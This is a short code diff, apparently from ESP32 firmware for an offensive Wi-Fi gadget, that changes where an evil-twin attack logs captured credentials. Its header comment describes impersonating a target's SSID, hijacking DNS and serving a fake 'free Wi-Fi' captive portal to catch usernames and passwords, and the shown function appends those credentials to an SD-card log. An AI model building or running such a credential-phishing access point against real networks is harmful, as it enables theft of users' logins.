@@ -10,7 +10,7 @@
  *        PHASE B (25 s): raw-IDF AP mode beaconing the target's SSID
  *                        on the target's channel, DNS hijack + HTTP
  *                        captive portal serving HTML_FREEWIFI,
- *                        catches creds to /poseidon/creds.log.
+ *                        catches creds to /poseidon/credentials/creds.log.
  *   3. Cycle repeats until ESC.
  *
  * Why time-slice instead of APSTA: Bruce-pinned libs crash
@@ -91,7 +91,8 @@ static bool s_ap_netif_created  = false;
 
 static void et_log_cred(const String &u, const String &p, const String &src)
 {
-    File f = SD.open("/poseidon/creds.log", FILE_APPEND);
+    sd_ensure_layout();
+    File f = SD.open(SD_CREDS_PATH, FILE_APPEND);
     if (!f) return;
     f.printf("%lu,%s,%s,%s,%s\n",
              (unsigned long)(millis() / 1000),
